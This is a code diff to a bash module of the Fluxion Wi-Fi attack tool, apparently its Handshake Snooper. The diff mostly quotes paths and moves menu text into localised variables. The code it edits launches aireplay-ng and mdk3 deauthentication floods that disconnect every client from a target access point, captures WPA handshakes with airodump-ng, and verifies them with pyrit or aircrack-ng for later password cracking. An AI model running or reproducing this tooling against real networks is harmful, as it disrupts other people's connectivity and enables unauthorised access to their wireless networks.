@@ -52,8 +52,8 @@ function handshake_stop_verifier() {
 
 function handshake_start_verifier() {
 	handshake_verifier_daemon $$ \
-	$FLUXIONPath/attacks/Handshake\ Snooper/handshakes/$APTargetSSIDClean-$APTargetMAC.cap \
-	$HANDSHAKEVerifier $FLUXIONWorkspacePath/capture/dump-01.cap \
+	"$FLUXIONPath/attacks/Handshake Snooper/handshakes/$APTargetSSIDClean-$APTargetMAC.cap" \
+	"$HANDSHAKEVerifier" "$FLUXIONWorkspacePath/capture/dump-01.cap" \
 	"$APTargetSSID" "$APTargetMAC" &> $FLUXIONOutputDevice &
 	HANDSHAKEVerifierPID=$!
 }
@@ -71,15 +71,15 @@ function handshake_start_deauthenticator() {
 
 	# Prepare deauthenticators
 	case "$HANDSHAKEMethod" in
-		"mdk3"*) echo "$APTargetMAC" > $FLUXIONWorkspacePath/mdk3_blacklist.lst
+		"$HandshakeSnooperMdk3MethodOption") echo "$APTargetMAC" > $FLUXIONWorkspacePath/mdk3_blacklist.lst
 	esac
 
 	# Start deauthenticators.
 	case "$HANDSHAKEMethod" in
-		"aireplay-ng"*) xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $APTargetSSID" -e \
+		"$HandshakeSnooperAireplayMethodOption") xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $APTargetSSID" -e \
 						aireplay-ng --deauth=9999999999 -a $APTargetMAC --ignore-negative-one $WIMonitor &
 			HANDSHAKEDeauthenticatorPID=$!;;
-		"mdk3"*) xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $APTargetSSID" -e \
+		"$HandshakeSnooperMdk3MethodOption") xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $APTargetSSID" -e \
 				 mdk3 $WIMonitor d -b $FLUXIONWorkspacePath/mdk3_blacklist.lst -c $APTargetChannel &
 			HANDSHAKEDeauthenticatorPID=$!;;
 	esac
@@ -97,7 +97,7 @@ function handshake_start_captor() {
 	if [ "$HANDSHAKECaptorPID" ]; then return 0; fi
 
 	xterm -hold -title "Handshake Captor (CH $APTargetChannel)" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e \
-	airodump-ng -d $APTargetMAC -w $FLUXIONWorkspacePath/capture/dump -c $APTargetChannel -a $WIMonitor &
+	airodump-ng -d $APTargetMAC -w "$FLUXIONWorkspacePath/capture/dump" -c $APTargetChannel -a $WIMonitor &
 
 	sleep 3
 	HANDSHAKECaptorPID=$(ps a | awk '$5~/^airodump-ng/ && $7~/'"$APTargetMAC"'/{print $1}')
@@ -110,12 +110,12 @@ function handshake_unset_method() {
 function handshake_set_method() {
 	if [ "$HANDSHAKEMethod" ]; then return 0; fi
 
-	local methods=("Monitor (${CYel}passive$CClr)" "aireplay-ng deauthentication (${CRed}aggressive$CClr)" "mdk3 deauthentication (${CRed}aggressive$CClr)" "$general_back")
-	io_query_choice "Select a method of handshake retrieval" methods[@]
+	local methods=("$HandshakeSnooperMonitorMethodOption" "$HandshakeSnooperAireplayMethodOption" "$HandshakeSnooperMdk3MethodOption" "$FLUXIONGeneralBackOption")
+	io_query_choice "$HandshakeSnooperMethodQuery" methods[@]
 
 	HANDSHAKEMethod=$IOQueryChoice
 
-	if [ "$HANDSHAKEMethod" = "$general_back" ]; then
+	if [ "$HANDSHAKEMethod" = "$FLUXIONGeneralBackOption" ]; then
 		handshake_unset_method
 		return 1
 	fi
@@ -128,16 +128,17 @@ function handshake_unset_verifier() {
 function handshake_set_verifier() {
 	if [ "$HANDSHAKEVerifier" ]; then return 0; fi
 
-	local verifiers=("pyrit" "aircrack-ng" "$general_back") # "pyrit (${CGrn}recommended$CClr)" "aircrack-ng (unreliable)")
-	io_query_choice "Select a method of handshake retrieval" verifiers[@]
+	local choices=("$FLUXIONHashVerificationMethodPyritOption" "$FLUXIONHashVerificationMethodAircrackOption" "$FLUXIONGeneralBackOption")
+	io_query_choice "$FLUXIONHashVerificationMethodQuery" choices[@]
 
-	HANDSHAKEVerifier=$IOQueryChoice
-
-	if [ "$HANDSHAKEVerifier" = "$general_back" ]; then
-		handshake_unset_verifier
-		handshake_unset_method
-		return 1
-	fi
+	case "$IOQueryChoice" in
+		"$FLUXIONHashVerificationMethodPyritOption") HANDSHAKEVerifier="pyrit";;
+		"$FLUXIONHashVerificationMethodAircrackOption") HANDSHAKEVerifier="aircrack-ng";;
+		"$FLUXIONGeneralBackOption") 
+			handshake_unset_verifier
+			handshake_unset_method
+			return 1;;
+	esac
 }
 
 function unprep_attack() {
@@ -149,9 +150,7 @@ function unprep_attack() {
 }
 
 function prep_attack() {
-	# if [ ${#@} -ne 3 ]; then return 1; fi
-
-	mkdir $FLUXIONWorkspacePath/capture
+	mkdir -p "$FLUXIONWorkspacePath/capture"
 
 	while true; do
 		handshake_set_method;	if [ $? -ne 0 ]; then break; fi
